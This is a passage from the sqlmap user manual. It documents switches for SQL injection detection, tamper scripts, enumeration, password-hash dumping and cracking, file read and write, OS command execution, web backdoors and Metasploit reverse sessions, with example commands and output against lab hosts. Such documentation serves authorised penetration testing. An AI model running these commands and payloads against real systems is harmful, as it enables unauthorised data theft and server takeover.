These techniques are detailed in the white paper Bursting Performances in Blind SQL Injection - Take 2
(Bandwidth) .
Note that this switch is incompatible with --text-only switch.

5.4.5 Concurrent HTTP(S) requests

Switch: --threads
It is possible to specify the maximum number of concurrent HTTP(S) requests that sqlmap is allowed to do.
This feature relies on the multi-threading concept and inherits both its pro and its cons.
This features applies to the brute-force switches and when the data fetching is done through any of the blind
SQL injection techniques. For the latter case, sqlmap rst calculates the length of the query output in a
single thread, then starts the multi-threading. Each thread is assigned to retrieve one character of the query
output. The thread ends when that character is retrieved - it takes up to 7 HTTP(S) requests with the
bisection algorithm implemented in sqlmap.
The maximum number of concurrent requests is set to 10 for performance and site reliability reasons.
Note that this switch is not compatible with --predict-output switch.


5.5 Injection
These options can be used to specify which parameters to test for, provide custom injection payloads and
optional tampering scripts.

5.5.1 Testable parameter(s)

Switch: -p
By default sqlmap tests all GET parameters and POST parameters. When the value of --level is >= 2 it
tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP
Referer header value for SQL injections. It is however possible to manually specify a comma-separated list
of parameter(s) that you want sqlmap to test. This will bypass the dependence on the value of --level too.
For instance, to test for GET parameter id and for HTTP User-Agent only, provide -p id,user-agent.

5.5.2 Force the database management system name

Switch: --dbms
By default sqlmap automatically detects the web application's back-end database management system. As
of version 0.9, sqlmap fully supports the following database management systems:

   • MySQL

   • Oracle

   • PostgreSQL

   • Microsoft SQL Server

   • Microsoft Access

   • SQLite
5. Usage                                                                                                 24


   • Firebird

   • Sybase

   • SAP MaxDB

If for any reason sqlmap fails to detect the back-end DBMS once a SQL injection has been identied
or if you want to avoid an active ngeprint, you can provide the name of the back-end DBMS yourself
(e.g. postgresql). For MySQL and Microsoft SQL Server provide them respectively in the form MySQL
<version> and Microsoft SQL Server <version>, where <version> is a valid version for the DBMS;
for instance 5.0 for MySQL and 2005 for Microsoft SQL Server.
In case you provide --fingerprint together with --dbms, sqlmap will only perform the extensive ngerprint
for the specied database management system only, read below for further details.
Note that this option is not mandatory and it is strongly recommended to use it only if you are absolutely
sure about the back-end database management system. If you do not know it, let sqlmap automatically
ngerprint it for you.

5.5.3 Force the database management system operating system name

Switch: --os
By default sqlmap automatically detects the web application's back-end database management system un-
derlying operating system when this information is a dependence of any other provided switch. At the
moment the fully supported operating systems are two:

   • Linux

   • Windows

It is possible to force the operating system name if you already know it so that sqlmap will avoid doing it
itself.
Note that this option is not mandatory and it is strongly recommended to use it only if you are absolutely
sure about the back-end database management system underlying operating system. If you do not know it,
let sqlmap automatically identify it for you.

5.5.4 Custom injection payload

Switches: --prefix and --suffix
In some circumstances the vulnerable parameter is exploitable only if the user provides a specic sux to
be appended to the injection payload. Another scenario where these options come handy presents itself
when the user already knows that query syntax and want to detect and exploit the SQL injection by directly
providing a injection payload prex and sux.
Example of vulnerable source code:

     $query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";


To detect and exploit this SQL injection, you can either let sqlmap detect the boundaries (as in combination
of SQL payload prex and sux) for you during the detection phase, or provide them on your own. For
example:
5. Usage                                                                                                  25


     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" \
       -p id --prefix "')" --suffix "AND ('abc'='abc"
     [...]


This will result in all sqlmap requests to end up in a query as follows:

     $query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";


Which makes the query syntactically correct.
In this simple example, sqlmap could detect the SQL injection and exploit it without need to provide custom
boundaries, but sometimes in real world application it is necessary to provide it when the injection point is
within nested JOIN queries for instance.

5.5.5 Tamper injection data

Switch: --tamper
sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by
their CHAR()-alike representation.
This switch can be very useful and powerful in situations where there is a weak input validation mechanism
between you and the back-end database management system. This mechanism usually is a self-developed
input validation routine called by the application source code, an expensive enterprise-grade IPS appliance
or a web application rewall (WAF). All buzzwords to dene the same concept, implemented in a dierent
way and costing lots of money, usually.
To take advantage of this switch, provide sqlmap with a comma-separated list of tamper scripts and this will
process the payload and return it transformed. You can dene your own tamper scripts, use sqlmap ones
from the tamper/ folder or edit them as long as you concatenate them comma-separated as the argument of
--tamper switch.
The format of a valid tamper script is as follows:

     # Needed imports
     from lib.core.enums import PRIORITY

     # Define which is the order of application of tamper scripts against the payload
     __priority__ = PRIORITY.NORMAL

     def tamper(payload):
         '''
         Description of your tamper script
         '''

          retVal = payload

          # your code to tamper the original payload

          # return the tampered payload
          return retVal


You can check valid and usable tamper scripts in the tamper/ directory.
Example against a MySQL target assuming that > character, spaces and capital SELECT string are banned:
5. Usage                                                                                                 26


     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper \
       tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

     [hh:mm:03] [DEBUG] cleaning up configuration parameters
     [hh:mm:03] [INFO] loading tamper script 'between'
     [hh:mm:03] [INFO] loading tamper script 'randomcase'
     [hh:mm:03] [INFO] loading tamper script 'space2comment'
     [...]
     [hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
     [hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
     [hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
     [hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
     [...]
     [hh:mm:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
     [hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
     58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
     ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
     group/**/bY/**/x)a)
     [hh:mm:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING
     clause' injectable
     [...]


5.6 Detection
These options can be used to specify how to parse and compare page content from HTTP responses when
using blind SQL injection technique.

5.6.1 Level

Switch: --level
This switch requires an argument which species the level of tests to perform. There are ve levels. The
default value is 1 where limited number of tests (requests) are performed. Vice versa, level 5 will test
verbosely for a much larger number of payloads and boundaries (as in pair of SQL payload prex and sux).
The payloads used by sqlmap are specied in the textual le xml/payloads.xml. Following the instructions
on top of the le, if sqlmap misses an injection, you should be able to add your own payload(s) to test for
too!
Not only this switch aects which payload sqlmap tries, but also which injection points are taken in exam:
GET and POST parameters are always tested, HTTP Cookie header values are tested from level 2 and
HTTP User-Agent/Referer headers' value is tested from level 3.
All in all, the harder it is to detect a SQL injection, the higher the --level must be set.
It is strongly recommended to higher this value before reporting to the mailing list that sqlmap is not able
to detect a certain injection point.

5.6.2 Risk

Switch: --risk
This switch requires an argument which species the risk of tests to perform. There are four risk values.
The default value is 1 which is innocuous for the majority of SQL injection points. Risk value 2 adds to
5. Usage                                                                                                     27


the default level the tests for heavy query time-based SQL injections and value 3 adds also OR-based SQL
injection tests.
In some instances, like a SQL injection in an UPDATE statement, injecting an OR-based payload can lead to
an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and
others this switch has been introduced: the user has control over which payloads get tested, the user can
arbitrarily choose to use also potentially dangerous ones. As per the previous switch, the payloads used by
sqlmap are specied in the textual le xml/payloads.xml and you are free to edit and add your owns.

5.6.3 Page comparison

Switches: --string, --regexp and --text-only
By default the distinction of a True query by a False one (rough concept behind boolean-based blind
SQL injection vulnerabilities) is done by comparing the injected requests page content with the original not
injected page content. Not always this concept works because sometimes the page content changes at each
refresh even not injecting anything, for instance when the page has a counter, a dynamic advertisement
banner or any other part of the HTML which is rendered dynamically and might change in time not only
consequently to user's input. To bypass this limit, sqlmap tries hard to identify these snippets of the response
bodies and deal accordingly. Sometimes it may fail, that is why the user can provide a string (--string
switch) which is always present on the not injected page and on all True injected query pages, but that
it is not on the False ones. As an alternative to a static string, the user can provide a regular expression
(--regexp switch).
Such data is easy for an user to retrieve, simply try to inject on the aected parameter an invalid value and
compare manually the original (not injected) page content with the injected wrong page content. This way
the distinction will be based upon string presence or regular expression match.
In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses' body, you can lter
pages (--text-only switch) just for their textual content. This way, in a good number of cases, you can
automatically tune the detection engine.


5.7 Techniques
These options can be used to tweak testing of specic SQL injection techniques.

5.7.1 SQL injection techniques to test for

Switch: --technique
This switch can be used to specify which SQL injection type to test for. By default sqlmap tests for all
types/techniques it supports.
In certain situations you may want to test only for one or few specic types of SQL injection thought and
this is where this switch comes into play.
This switch requires an argument. Such argument is a string composed by any combination of B, E, U, S and
T characters where each letter stands for a dierent technique:

   • B: Boolean-based blind SQL injection

   • E: Error-based SQL injection

   • U: UNION query SQL injection
5. Usage                                                                                                   28


   • S: Stacked queries SQL injection

   • T: Time-based blind SQL injection

For instance, you can provide ES if you want to test for and exploit error-based and stacked queries SQL
injection types only. The default value is BEUST.
Note that the string must include stacked queries technique letter, S, when you want to access the le system,
takeover the operating system or access Windows registry hives.

5.7.2 Seconds to delay the DBMS response for time-based blind SQL injection

Switch: --time-sec
It is possible to set the seconds to delay the response when testing for time-based blind SQL injection, by
providing the --time-sec option followed by an integer. By default delay is set to 5 seconds.

5.7.3 Number of columns in UNION query SQL injection

Switch: --union-cols
By default sqlmap tests for UNION query SQL injection technique using 1 to 10 columns. However, this
range can be increased up to 50 columns by providing an higher --level value. See the relevant paragraph
for details.
You can manually tell sqlmap to test for this type of SQL injection with a specic range of columns by
providing the tool with the --union-cols switch followed by a range of integers. For instance, 12-16 means
tests for UNION query SQL injection by using 12 up to 16 columns.

5.7.4 Character to use to test for UNION query SQL injection

Switch: --union-char
By default sqlmap tests for UNION query SQL injection technique using NULL character. However, by
providing an higher --level value sqlmap will performs tests also with a random number because there are
some corner cases where UNION query tests with NULL fail whereas with a random integer they succeed.
You can manually tell sqlmap to test for this type of SQL injection with a specic character by providing
the tool with the --union-char switch followed by a string.


5.8 Fingerprint
5.8.1 Extensive database management system ngerprint

Switches: -f or --fingerprint
By default the web application's back-end database management system ngerprint is handled automatically
by sqlmap. Just after the detection phase nishes and the user is eventually prompted with a choice of which
vulnerable parameter to use further on, sqlmap ngerprints the back-end database management system and
carries on the injection by knowing which SQL syntax, dialect and queries to use to proceed with the attack
within the limits of the database architecture.
If for any instance you want to perform an extensive database management system ngerprint based on
various techniques like specic SQL dialects and inband error messages, you can provide the --fingerprint
5. Usage                                                                                                 29


switch. sqlmap will perform a lot more requests and ngerprint the exact DBMS version and, where possible,
operating system, architecture and patch level.
If you want the ngerprint to be even more accurate result, you can also provide the -b or --banner switch.


5.9 Enumeration
These options can be used to enumerate the back-end database management system information, structure
and data contained in the tables. Moreover you can run your own SQL statements.

5.9.1 Banner

Switch: -b or --banner
Most of the modern database management systems have a function and/or an environment variable which
returns the database management system version and eventually details on its patch level, the underly-
ing system. Usually the function is version() and the environment variable is @@version, but this vary
depending on the target DBMS.

5.9.2 Session user

Switch: --current-user
On the majority of modern DBMSes is possible to retrieve the database management system's user which is
eectively performing the query against the back-end DBMS from the web application.

5.9.3 Current database

Switch: --current-db
It is possible to retrieve the database management system's database name that the web application is
connected to.

5.9.4 Detect whether or not the session user is a database administrator

Switch: --is-dba
It is possible to detect if the current database management system session user is a database administrator,
also known as DBA. sqlmap will return True if it is, viceversa False.

5.9.5 List database management system users

Switch: --users
When the session user has read access to the system table containing information about the DBMS users, it
is possible to enumerate the list of users.

5.9.6 List and crack database management system users password hashes

Switches: --passwords and -U
5. Usage                                                                                                     30


When the session user has read access to the system table containing information about the DBMS users'
passwords, it is possible to enumerate the password hashes for each database management system user.
sqlmap will rst enumerate the users, then the dierent password hashes for each of them.
Example against a PostgreSQL target:

     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1

     [...]
     back-end DBMS: PostgreSQL
     [hh:mm:38] [INFO] fetching database users password hashes
     do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
     [hh:mm:42] [INFO] using hash method: 'postgres_passwd'
     what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]
     [hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
     do you want to use common password suffixes? (slow!) [y/N] n
     [hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
     [hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
     [hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
     database management system users password hashes:
     [*] postgres [1]:
         password hash: md5d7d880f96044b72d0bba108ace96d1e4
         clear-text password: testpass
     [*] testuser [1]:
         password hash: md599e5ea7a6f7c3269995cba3927fd0093
         clear-text password: testpass


Not only sqlmap enumerated the DBMS users and their passwords, but it also recognized the hash format
to be PostgreSQL, asked the user whether or not to test the hashes against a dictionary le and identied
the clear-text password for the postgres user, which is usually a DBA along the other user, testuser,
password.
This feature has been implemented for all DBMS where it is possible to enumerate users' password hashes,
including Oracle and Microsoft SQL Server pre and post 2005.
You can also provide the -U option to specify the specic user who you want to enumerate and eventually
crack the password hash(es). If you provide CU as username it will consider it as an alias for current user
and will retrieve the password hash(es) for this user.

5.9.7 List database management system users privileges

Switches: --privileges and -U
When the session user has read access to the system table containing information about the DBMS users, it
is possible to enumerate the privileges for each database management system user. By the privileges, sqlmap
will also show you which are database administrators.
You can also provide the -U option to specify the user who you want to enumerate the privileges.
If you provide CU as username it will consider it as an alias for current user and will enumerate the privileges
for this user.
On Microsoft SQL Server, this feature will display you whether or not each user is a database administrator
rather than the list of privileges for all users.
5. Usage                                                                                                     31


5.9.8 List database management system users roles

Switches: --roles and -U
When the session user has read access to the system table containing information about the DBMS users, it
is possible to enumerate the roles for each database management system user.
You can also provide the -U option to specify the user who you want to enumerate the privileges.
If you provide CU as username it will consider it as an alias for current user and will enumerate the privileges
for this user.
This feature is only available when the DBMS is Oracle.

5.9.9 List database management system's databases

Switch: --dbs
When the session user has read access to the system table containing information about available databases,
it is possible to enumerate the list of databases.

5.9.10 Enumerate database's tables

Switches: --tables, -D and --exclude-sysdbs
When the session user has read access to the system table containing information about databases' tables,
it is possible to enumerate the list of tables for a specic database management system's databases.
If you do not provide a specic database with switch -D, sqlmap will enumerate the tables for all DBMS
databases.
You can also provide the --exclude-sysdbs switch to exclude all system databases.
Note that on Oracle you have to provide the TABLESPACE_NAME instead of the database name.

5.9.11 Enumerate database table columns

Switches: --columns, -C, -T and -D
When the session user has read access to the system table containing information about database's tables,
it is possible to enumerate the list of columns for a specic database table. sqlmap also enumerates the
data-type for each column.
This feature depends on the option -T to specify the table name and optionally on -D to specify the database
name. When the database name is not specied, the current database name is used. You can also provide
the -C option to specify the table columns name like the one you provided to be enumerated.
Example against a SQLite target:

     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns \
       -D testdb -T users -C name
     [...]
     Database: SQLite_masterdb
     Table: users
     [3 columns]
     +---------+---------+
     | Column | Type     |
     +---------+---------+
5. Usage                                                                                                  32


     | id      | INTEGER |
     | name    | TEXT    |
     | surname | TEXT    |
     +---------+---------+

Note that on PostgreSQL you have to provide public or the name of a system database. That's because it is
not possible to enumerate other databases tables, only the tables under the schema that the web application's
user is connected to, which is always aliased by public.

5.9.12 Dump database table entries

Switches: --dump, -C, -T, -D, --start, --stop, --first and --last
When the session user has read access to a specic database's table it is possible to dump the table entries.
This functionality depends on switch -T to specify the table name and optionally on switch -D to specify
the database name. If the table name is provided, but the database name is not, the current database name
is used.
Example against a Firebird target:

     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
     [...]
     Database: Firebird_masterdb
     Table: USERS
     [4 entries]
     +----+--------+------------+
     | ID | NAME   | SURNAME     |
     +----+--------+------------+
     | 1 | luther | blisset     |
     | 2 | fluffy | bunny        |
     | 3 | wu      | ming        |
     | 4 | NULL    | nameisnull |
     +----+--------+------------+

This switch can also be used to dump all tables' entries of a provided database. You simply have to provide
sqlmap with the --dump switch along with only the -D switch, no -T and no -C.
You can also provide a comma-separated list of the specic columns to dump with the -C switch.
sqlmap also generates for each table dumped the entries in a CSV format textual le. You can see the
absolute path where sqlmap creates the le by providing a verbosity level greater than or equal to 1.
If you want to dump only a range of entries, then you can provide switches --start and/or --stop to
respectively start to dump from a certain entry and stop the dump at a certain entry. For instance, if you
want to dump only the rst entry, provide --stop 1 in your command line. Vice versa if, for instance, you
want to dump only the second and third entry, provide --start 1 --stop 3.
It is also possible to specify which single character or range of characters to dump with switches --first
and --last. For instance, if you want to dump columns' entries from the third to the fth character, provide
--first 3 --last 5. This feature only applies to the blind SQL injection techniques because for error-based
and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the
length of the column's entry output to dump.
As you may have noticed by now, sqlmap is exible: you can leave it to automatically dump the whole
database table or you can be very precise in which characters to dump, from which columns and which range
of entries.
5. Usage                                                                                                33


5.9.13 Dump all databases tables entries

Switches: --dump-all and --exclude-sysdbs
It is possible to dump all databases tables entries at once that the session user has read access on.
You can also provide the --exclude-sysdbs switch to exclude all system databases. In that case sqlmap
will only dump entries of users' databases tables.
Note that on Microsoft SQL Server the master database is not considered a system database because some
database administrators use it as a users' database.

5.9.14 Search for columns, tables or databases

Switches: --search, -C, -T, -D
This switch allows you to search for specic database names, specic tables across all databases
or specic columns across all databases' tables.
This is useful, for instance, to identify tables containing custom application credentials where relevant
columns' names contain string like name and pass .
The switch --search needs to be used in conjunction with one of the following support switches:

   • -C following a list of comma-separated column names to look for across the whole database management
     system.
   • -T following a list of comma-separated table names to look for across the whole database management
     system.
   • -D following a list of comma-separated database names to look for across the database management
     system.

5.9.15 Run custom SQL statement

Switches: --sql-query and --sql-shell
The SQL query and the SQL shell features allow to run arbitrary SQL statements on the database man-
agement system. sqlmap automatically dissects the provided statement, determines which technique is
appropriate to use to inject it and how to pack the SQL payload accordingly.
If the query is a SELECT statement, sqlmap will retrieve its output. Otherwise it will execute the query
through the stacked query SQL injection technique if the web application supports multiple statements on
the back-end database management system. Beware that some web application technologies do not support
stacked queries on specic database management systems. For instance, PHP does not support stacked
queries when the back-end DBMS is MySQL, but it does support when the back-end DBMS is PostgreSQL.
Examples against a Microsoft SQL Server 2000 target:

     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
       "SELECT 'foo'" -v 1

     [...]
     [hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
     [hh:mm:14] [INFO] retrieved: foo
     SELECT 'foo':    'foo'
5. Usage                                                                                                  34


     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
       "SELECT 'foo', 'bar'" -v 2

     [...]
     [hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
     [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into
     distinct queries to be able to retrieve the output even if we are going blind
     [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)),
     (CHAR(32)))
     [hh:mm:50] [INFO] retrieved: foo
     [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
     [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)),
     (CHAR(32)))
     [hh:mm:50] [INFO] retrieved: bar
     [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
     SELECT 'foo', 'bar':    'foo, bar'


As you can see, sqlmap splits the provided query into two dierent SELECT statements then retrieves the
output for each separate query.
If the provided query is a SELECT statement and contains a FROM clause, sqlmap will ask you if such statement
can return multiple entries. In that case the tool knows how to unpack the query correctly to count the
number of possible entries and retrieve its output, entry per entry.
The SQL shell option allows you to run your own SQL statement interactively, like a SQL console connected
to the database management system. This feature provides TAB completion and history support too.


5.10 Brute force
These options can be used to run brute force checks.

5.10.1 Brute force tables names

Switches: --common-tables
There are cases where --tables switch can not be used to retrieve the databases' table names. These cases
usually t into one of the following categories:

   • The database management system is MySQL < 5.0 where information_schema is not available.

   • The database management system is Microsoft Access and system table MSysObjects is not readable
     - default setting.
   • The session user does not have read privileges against the system table storing the scheme of the
     databases.

If any of the rst two cases apply and you provided the --tables switch, sqlmap will prompt you with a
question to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly
still identify some existing tables if you provide it with the --common-tables switch. sqlmap will perform a
brute-force attack in order to detect the existence of common tables across the DBMS.
The list of common table names is txt/common-tables.txt and you can edit it as you wish.
Example against a MySQL 4.1 target:
5. Usage                                                                                                35


     $ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" \
       --common-tables -D testdb --banner

     [...]
     [hh:mm:39] [INFO] testing MySQL
     [hh:mm:39] [INFO] confirming MySQL
     [hh:mm:40] [INFO] the back-end DBMS is MySQL
     [hh:mm:40] [INFO] fetching banner
     web server operating system: Windows
     web application technology: PHP 5.3.1, Apache 2.2.14
     back-end DBMS operating system: Windows
     back-end DBMS: MySQL < 5.0.0
     banner:    '4.1.21-community-nt'

     [hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
     [hh:mm:40] [INFO] adding words used on web page to the check list
     please enter number of threads? [Enter for 1 (current)] 8
     [hh:mm:43] [INFO] retrieved: users

     Database: testdb
     [1 table]
     +-------+
     | users |
     +-------+


5.10.2 Brute force columns names

Switches: --common-columns
As per tables, there are cases where --columns switch can not be used to retrieve the databases' tables'
column names. These cases usually t into one of the following categories:

   • The database management system is MySQL < 5.0 where information_schema is not available.

   • The database management system is Microsoft Access where this kind of information is not available
     inside system tables.
   • The session user does not have read privileges against the system table storing the scheme of the
     databases.

If any of the rst two cases apply and you provided the --columns switch, sqlmap will prompt you with a
question to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly
still identify some existing tables if you provide it with the --common-columns switch. sqlmap will perform
a brute-force attack in order to detect the existence of common columns across the DBMS.
The list of common table names is txt/common-columns.txt and you can edit it as you wish.

5.11 User-dened function injection
These options can be used to create custom user-dened functions.

5.11.1 Inject custom user-dened functions (UDF)

Switches: --udf-inject and --shared-lib
5. Usage                                                                                                 36


You can inject your own user-dened functions (UDFs) by compiling a MySQL or PostgreSQL shared library,
DLL for Windows and shared object for Linux/Unix, then provide sqlmap with the path where the shared
library is stored locally on your machine. sqlmap will then ask you some questions, upload the shared
library on the database server le system, create the user-dened function(s) from it and, depending on your
options, execute them. When you are nished using the injected UDFs, sqlmap can also remove them from
the database for you.
These techniques are detailed in the white paper Advanced SQL injection to operating system full control .
Use switch --udf-inject and follow the instructions.
If you want, you can specify the shared library local le system path via command line too by using
--shared-lib option. Vice versa sqlmap will ask you for the path at runtime.
This feature is available only when the database management system is MySQL or PostgreSQL.


5.12 File system access
5.12.1 Read a le from the database server's le system

Switch: --file-read
It is possible to retrieve the content of les from the underlying le system when the back-end database
management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the
needed privileges to abuse database specic functionalities and architectural weaknesses. The le specied
can be either a textual or a binary le. sqlmap will handle it properly.
These techniques are detailed in the white paper Advanced SQL injection to operating system full control .
Example against a Microsoft SQL Server 2005 target to retrieve a binary le:

     $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
       --file-read "C:/example.exe" -v 1

     [...]
     [hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
     web server operating system: Windows 2000
     web application technology: ASP.NET, Microsoft IIS 6.0, ASP
     back-end DBMS: Microsoft SQL Server 2005

     [hh:mm:50] [INFO] fetching file: 'C:/example.exe'
     [hh:mm:50] [INFO] the SQL query provided returns 3 entries
     C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'
     [...]

     $ ls -l output/192.168.136.129/files/C__example.exe
     -rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe

     $ file output/192.168.136.129/files/C__example.exe
     output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
     80386 32-bit


5.12.2 Upload a le to the database server's le system

Switches: --file-write and --file-dest
5. Usage                                                                                                     37


It is possible to upload a local le to the database server's le system when the back-end database manage-
ment system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed
privileges to abuse database specic functionalities and architectural weaknesses. The le specied can be
either a textual or a binary le. sqlmap will handle it properly.
These techniques are detailed in the white paper Advanced SQL injection to operating system full control .
Example against a MySQL target to upload a binary UPX-compressed le:

     $ file /software/nc.exe.packed
     /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit

     $ ls -l /software/nc.exe.packed
     -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

     $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
       "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1

     [...]
     [hh:mm:29] [INFO] the back-end DBMS is MySQL
     web server operating system: Windows 2003 or 2008
     web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
     back-end DBMS: MySQL >= 5.0.0

     [...]
     do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully
     written on the back-end DBMS file system? [Y/n] y
     [hh:mm:52] [INFO] retrieved: 31744
     [hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes,
     same size as the local file '/software/nc.exe.packed'


5.13 Operating system takeover
5.13.1 Run arbitrary operating system command

Switches: --os-cmd and --os-shell
It is possible to run arbitrary commands on the database server's underlying operating system
when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server,
and the session user has the needed privileges to abuse database specic functionalities and architectural
weaknesses.
On MySQL and PostgreSQL, sqlmap uploads (via the le upload functionality explained above) a shared
library (binary le) containing two user-dened functions, sys_exec() and sys_eval(), then it creates these
two functions on the database and calls one of them to execute the specied command, depending on user's
choice to display the standard output or not. On Microsoft SQL Server, sqlmap abuses the xp_cmdshell
stored procedure: if it is disabled (by default on Microsoft SQL Server >= 2005), sqlmap re-enables it; if it
does not exist, sqlmap creates it from scratch.
When the user requests the standard output, sqlmap uses one of the enumeration SQL injection techniques
(blind, inband or error-based) to retrieve it. Vice versa, if the standard output is not required, stacked query
SQL injection technique is used to execute the command.
These techniques are detailed in the white paper Advanced SQL injection to operating system full control .
Example against a PostgreSQL target:
5. Usage                                                                                                  38


     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
       --os-cmd id -v 1

     [...]
     web application technology: PHP 5.2.6, Apache 2.2.9
     back-end DBMS: PostgreSQL
     [hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
     [hh:mm:12] [INFO] the back-end DBMS operating system is Linux
     [hh:mm:12] [INFO] testing if current user is DBA
     [hh:mm:12] [INFO] detecting back-end DBMS version from its banner
     [hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
     [hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
     [hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
     [hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
     do you want to retrieve the command standard output? [Y/n/a] y
     command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'

     [hh:mm:19] [INFO] cleaning up the database management system
     do you want to remove UDF 'sys_eval'? [Y/n] y
     do you want to remove UDF 'sys_exec'? [Y/n] y
     [hh:mm:23] [INFO] database management system cleanup finished
     [hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can
     only be deleted manually


It is also possible to simulate a real shell where you can type as many arbitrary commands as you wish. The
option is --os-shell and has the same TAB completion and history functionalities that --sql-shell has.
Where stacked queries has not been identied on the web application (e.g. PHP or ASP with back-end
database management system being MySQL) and the DBMS is MySQL, it is still possible to abuse the
SELECT clause's INTO OUTFILE to create a web backdoor in a writable folder within the web server document
root and still get command execution assuming the back-end DBMS and the web server are hosted on the
same server. sqlmap supports this technique and allows the user to provide a comma-separated list of possible
document root sub-folders where try to upload the web le stager and the subsequent web backdoor. Also,
sqlmap has its own tested web le stagers and backdoors for the following languages:

   • ASP

   • ASP.NET

   • JSP

   • PHP


5.13.2 Out-of-band stateful connection: Meterpreter & friends

Switches: --os-pwn, --os-smbrelay, --os-bof, --priv-esc, --msf-path and --tmp-path
It is possible to establish an out-of-band stateful TCP connection between the attacker machine
and the database server underlying operating system when the back-end database management system is
either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse
database specic functionalities and architectural weaknesses. This channel can be an interactive command
prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice.
sqlmap relies on Metasploit to create the shellcode and implements four dierent techniques to execute it on
the database server. These techniques are:
5. Usage                                                                                                    39


   • Database in-memory execution of the Metasploit's shellcode via sqlmap own user-dened func-
     tion sys_bineval(). Supported on MySQL and PostgreSQL - switch --os-pwn.
   • Upload and execution of a Metasploit's stand-alone payload stager via sqlmap own user-dened
     function sys_exec() on MySQL and PostgreSQL or via xp_cmdshell() on Microsoft SQL Server -
     switch --os-pwn.
   • Execution of Metasploit's shellcode by performing a SMB reection attack (MS08-068 ) with a
     UNC path request from the database server to the attacker's machine where the Metasploit smb_relay
     server exploit listens. Supported when running sqlmap with high privileges (uid=0) on Linux/Unix
     and the target DBMS runs as Administrator on Windows - switch --os-smbrelay.
   • Database in-memory execution of the Metasploit's shellcode by exploiting Microsoft SQL Server
     2000 and 2005 sp_replwritetovarbin stored procedure heap-based buer overow (MS09-
